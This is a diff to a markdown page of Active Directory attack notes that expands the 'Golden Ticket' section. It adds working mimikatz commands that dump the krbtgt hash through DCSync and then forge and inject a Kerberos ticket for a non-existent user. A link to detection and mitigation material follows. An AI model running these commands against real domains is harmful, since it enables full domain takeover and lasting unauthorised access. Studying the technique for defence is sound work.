@@ -22,8 +22,14 @@ More information, demonstration and ways to detect, mitigate and respond: https:
 
 ## Golden Ticket
 
-Compromising the ```krbtgt``` user hash to create Kerberos tickets as if you were Active Directory.
+Compromising the ```krbtgt``` user hash to create Kerberos tickets as if you were Active Directory: issuing tickets for users that don’t exist, adding users to groups in which they don’t belong, or issuing tickets with lifetimes far beyond the configured maximum.
 
-1) 
+The Golden Ticket recipe contains 3 elements:
+- Domain name
+- Domain SID
+- ```krbtgt``` user password hash
+
+1) Compromise the ```krbtgt``` Password Hash (by using ```mimikatz.exe "lsadump::dcsync /user:DOMAIN\KRBTGT"``` for example)
+2) Forge Kerberos tickets like TGT using the Golden Ticket (```krbtgt``` Password Hash) with tools like ```mimikatz``` or ```impacket``` (example: ```mimikatz.exe "kerberos::golden /domain:[DOMAIN] /sid:[SID] /aes256:[KRBTGT hash] /user:NonExistentUser /groups:513,2668 /ptt"```)
 
 More information, demonstration and ways to detect, mitigate and respond: https://attack.stealthbits.com/how-golden-ticket-attack-works
